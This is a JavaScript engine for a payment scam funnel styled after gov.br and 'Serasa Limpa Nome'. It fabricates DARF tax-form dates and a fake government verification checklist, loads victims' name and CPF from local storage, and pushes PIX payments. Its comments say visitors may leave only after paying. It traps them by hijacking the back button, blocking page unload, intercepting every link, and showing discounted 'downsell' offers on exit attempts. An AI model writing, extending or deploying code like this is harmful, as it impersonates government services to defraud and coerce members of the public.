/* ===== Motor das páginas de upsell SERASA LIMPA NOME (estilo gov.br) =====
   A página define window.UPSELL_CFG = { slug, productName, price, downsell:{price,title,text}, nextUrl, okText, loading:{labels[],items[],pend:{n,html}} }
   Regras (mesmas do Programa Premium): saída da página SOMENTE pelo onPaid do PIX;
   voltar/sair abre o DOWNSELL; quem chega no downsell não sai sem pagar. */
(function(){
  var cfg = window.UPSELL_CFG; if (!cfg) return;
  var ds = cfg.downsell || {};
  var LS = window.LS || { get: function(k){ try{return localStorage.getItem(k)||'';}catch(e){return '';} }, set: function(k,v){ try{localStorage.setItem(k,v);}catch(e){} } };
  var qs = new URLSearchParams(location.search);
  var fromEmail = qs.get('src') === 'email';
  function brl(v){ return 'R$ ' + Number(v).toFixed(2).replace('.', ','); }
  function esc(s){ return String(s==null?'':s).replace(/[&<>"]/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c];}); }
  var consulta = {}; try { consulta = JSON.parse(LS.get('sr_consulta')||'{}'); } catch(e){}
  var fullName = consulta.nome || LS.get('funil_nome') || '';
  var first = (fullName.split(' ')[0] || 'Cidadão').toUpperCase();
  var customer = { name: fullName || 'Cidadão', email: LS.get('funil_email') || '', phone: LS.get('funil_phone') || '', document: (consulta.cpf || LS.get('funil_cpf') || '').replace(/\D/g,'') };
  var sessionId = LS.get('funil_session') || ('DES_' + Date.now()); LS.set('funil_session', sessionId);
  var tp = document.getElementById('first-name'); if (tp) tp.textContent = first;

  /* datas do DARF */
  var now = new Date(), p = function(n){ return String(n).padStart(2,'0'); };
  var hoje = p(now.getDate())+'/'+p(now.getMonth()+1)+'/'+now.getFullYear();
  var e1 = document.getElementById('darf-emit'); if (e1) e1.textContent = hoje+' '+p(now.getHours())+':'+p(now.getMinutes())+':'+p(now.getSeconds());
  var e2 = document.getElementById('darf-ate'); if (e2) e2.textContent = hoje;

  /* loading gov (checklist ~10s) */
  (function(){
    var scr = document.getElementById('gov-loading'); if (!scr) return;
    try{ if('scrollRestoration' in history) history.scrollRestoration='manual'; }catch(e){}
    window.scrollTo(0,0);
    var L = cfg.loading || {};
    var labels = L.labels || [];
    var bar = document.getElementById('gov-progress-fill'), lbl = document.getElementById('loading-step-label'), rail = document.getElementById('timeline-fill');
    var i = 0, n = 4;
    function step(){
      var it = document.getElementById('ck-'+(i+1)); if (it) it.classList.add('done');
      if (lbl && labels[i]) lbl.textContent = labels[i];
      if (bar) bar.style.width = Math.round(((i+1)/n)*100)+'%';
      if (rail) rail.style.height = Math.round((i/(n-1))*100)+'%';
      i++;
      if (i < n) setTimeout(step, 2100);
      else {
        var pa = document.getElementById('pend-alert'); if (pa) pa.classList.add('show');
        setTimeout(function(){ scr.classList.add('hide'); scr.setAttribute('aria-hidden','true'); setTimeout(function(){ scr.style.display='none'; }, 600); }, 1800);
      }
    }
    setTimeout(step, 600);
  })();

  /* ---------- PIX modal ---------- */
  var overlay = document.getElementById('pix-overlay');
  var amountEl = document.getElementById('pix-amount');
  var subEl = document.getElementById('pix-sub');
  var titleEl = document.getElementById('pix-title');
  var current = 'main';
  function openPix(target){
    closeDownsell();
    current = target;
    var isDs = (target === 'downsell');
    var price = isDs ? ds.price : cfg.price;
    if (amountEl) amountEl.textContent = brl(price);
    if (subEl) subEl.textContent = isDs ? (ds.pixSub || 'Valor reduzido liberado. Escaneie o QR Code ou copie o código abaixo') : (cfg.pixSub || 'Escaneie o QR Code ou copie o código abaixo');
    if (titleEl) titleEl.textContent = isDs ? 'Pague com PIX (valor reduzido)' : 'Pague com PIX';
    overlay.classList.add('show'); overlay.setAttribute('aria-hidden','false'); document.body.style.overflow='hidden';
    var prodName = isDs ? (ds.title || cfg.productName) : cfg.productName;
    try { fbq('track','InitiateCheckout',{value:price,currency:'BRL'}); } catch(e){}
    try {
      if (typeof window.trackLowTrackPix === 'function') {
        window.trackLowTrackPix({
          amount: price,
          productName: prodName,
          id: 'UPS_' + (cfg.slug || 'offer') + '_' + Date.now()
        });
      }
    } catch(eTrk){}
    initPixPanel('pix-panel', {
      productType: cfg.slug,
      productName: isDs ? (ds.title || cfg.productName) : cfg.productName,
      amount: price,
      sessionId: sessionId,
      isUpsell: true,
      isDownsell: isDs,
      fromEmail: fromEmail,
      client: customer,
      onPaid: function(){
        try { fbq('track','Purchase',{value:price,currency:'BRL'}); } catch(e){}
        try {
          if (typeof window.trackLowTrackPix === 'function') {
            window.trackLowTrackPix({
              amount: price,
              productName: prodName,
              id: 'PAID_' + (cfg.slug || 'offer') + '_' + Date.now()
            });
          }
        } catch(eTrk){}
        var ok = document.getElementById('paid-ok'); if (ok) { ok.textContent = cfg.okText || 'Pagamento confirmado! ✅'; ok.style.display='block'; }
        window.__allowLeave = true;
        try { if (window.fireConfetti) fireConfetti(40); } catch(e){}
        setTimeout(goNext, 400);
      },
      accent: '#1351B4',
      apiBase: '../../api_proxy.php',
      resume: window.__PIX_RESUME || null
    });
    window.__PIX_RESUME = null;
  }
  /* Resolve ../slug/ even if the current URL has no trailing slash.
     Without this, /upsell/iof + ../multa_ir/ becomes /multa_ir/ (homepage SPA fallback). */
  function resolveNext(url) {
    url = String(url || '');
    if (!url) return url;
    if (/^https?:\/\//i.test(url)) return url;
    if (url.charAt(0) === '/') return url;
    var path = location.pathname || '/';
    if (!/\/$/.test(path)) {
      path = /\.[a-zA-Z0-9]{1,8}$/.test(path) ? path.replace(/\/[^/]+$/, '/') : (path + '/');
    }
    try {
      var u = new URL(url, location.origin + path);
      var out = u.pathname;
      if (out.slice(-1) !== '/' && !/\.[a-zA-Z0-9]{1,8}$/.test(out)) out += '/';
      return out + u.search + u.hash;
    } catch (e) {
      return url;
    }
  }
  var _left = false;
  function goNext() {
    if (_left) return;
    _left = true;
    window.__allowLeave = true;
    var url = resolveNext(cfg.nextUrl);
    if (window.__withParams) url = window.__withParams(url);
    try { window.location.replace(url); } catch (e) { window.location.href = url; }
  }
  window.openPix = openPix;
  function closePixToDownsell(){
    /* "Cancelar e voltar" / fechar: nunca sai da página — mostra o downsell (ou mantém o PIX do downsell) */
    if (current === 'downsell') { shake(); return; }
    overlay.classList.remove('show'); overlay.setAttribute('aria-hidden','true'); document.body.style.overflow='';
    showDownsell();
  }
  var bc = document.getElementById('pix-close'); if (bc) bc.onclick = closePixToDownsell;
  var bk = document.getElementById('pix-cancel'); if (bk) bk.onclick = closePixToDownsell;

  /* botões de pagar (um ou mais) */
  function markCheckoutBtns(){
    Array.prototype.forEach.call(document.querySelectorAll('[data-pay], #btn-downsell, #btn-downsell-main, #btn-ressarcir, #btn-pagar-verif'), function(b){
      if (b && !b.classList.contains('btn-checkout')) b.classList.add('btn-checkout');
    });
  }
  markCheckoutBtns();
  Array.prototype.forEach.call(document.querySelectorAll('[data-pay]'), function(b){ b.addEventListener('click', function(){ openPix('main'); }); });
  var br = document.getElementById('btn-ressarcir'); if (br) br.addEventListener('click', function(){ var d = document.getElementById('refund-details'); if (d) d.classList.add('show'); br.style.display='none'; });

  /* ---------- Downsell ---------- */
  var dm = document.getElementById('downsell-modal');
  function showDownsell(){ if (!dm) return; dm.classList.add('show'); try { fbq('trackCustom','DownsellView',{slug:cfg.slug}); } catch(e){} }
  function closeDownsell(){ if (dm) dm.classList.remove('show'); }
  function shake(){ var card = dm && dm.querySelector('.ds-card'); if (!card) card = overlay.querySelector('.modal'); if (card) { card.classList.remove('ups-shake'); void card.offsetWidth; card.classList.add('ups-shake'); } }
  window.showDownsell = showDownsell;
  var bd = document.getElementById('btn-downsell'); if (bd) bd.addEventListener('click', function(){ openPix('downsell'); });
  var bdm = document.getElementById('btn-downsell-main'); if (bdm) bdm.addEventListener('click', function(){ openPix('main'); });

  /* trap de saída: voltar reabre o downsell; nunca navega sem pagar */
  (function(){
    function guard(){ try { history.pushState({__ds:1}, '', location.href); } catch(e){} }
    guard();
    window.addEventListener('popstate', function(){ guard(); if (overlay.classList.contains('show')) { if (current==='downsell') shake(); else closePixToDownsell(); } else if (dm && !dm.classList.contains('show')) showDownsell(); else shake(); });
    window.addEventListener('beforeunload', function(e){ if (!window.__allowLeave) { e.preventDefault(); e.returnValue=''; } });
    var fired = false;
    document.addEventListener('mouseleave', function(e){ if (e.clientY <= 0 && !fired) { fired = true; if (!overlay.classList.contains('show')) showDownsell(); } });
    var hid = false; document.addEventListener('visibilitychange', function(){ if (document.hidden) hid = true; else if (hid && !overlay.classList.contains('show') && !fired) { fired = true; showDownsell(); } });
  })();
  /* saída permitida só após pagamento */
  document.addEventListener('click', function(ev){ var a = ev.target.closest && ev.target.closest('a[href]'); if (a && !a.hasAttribute('data-allow')) { ev.preventDefault(); showDownsell(); } });

  /* chegada via e-mail de recuperação (?src=email&t=&k=) → retoma o PIX gerado */
  if (fromEmail && qs.get('t') && qs.get('k')) {
    fetch('../../api_proxy.php?action=recover_info&t='+encodeURIComponent(qs.get('t'))+'&k='+encodeURIComponent(qs.get('k')))
      .then(function(r){ return r.json(); })
      .then(function(j){
        if (!j || !j.ok) return;
        var c = j.client || {};
        if (c.name) { customer.name = c.name; LS.set('funil_nome', c.name); }
        if (c.email) customer.email = c.email; if (c.phone) customer.phone = c.phone; if (c.document) customer.document = c.document;
        if (j.transactionId && j.pixCode) window.__PIX_RESUME = { transactionId: j.transactionId, pixCode: j.pixCode, pixQr: j.pixQr || null };
        if (c.name) { var t2 = document.getElementById('first-name'); if (t2) t2.textContent = c.name.split(' ')[0].toUpperCase(); }
      }).catch(function(){});
  }
  /* liberar saída quando o PIX confirmar (onPaid faz location.replace) */
  window.__allowLeave = false;
  var _obs = setInterval(function(){ var ok = document.getElementById('paid-ok'); if (ok && ok.style.display==='block') { window.__allowLeave = true; clearInterval(_obs); } }, 300);
  document.addEventListener('visibilitychange', function(){
    if (document.visibilityState === 'visible' && window.__allowLeave) goNext();
  });
})();
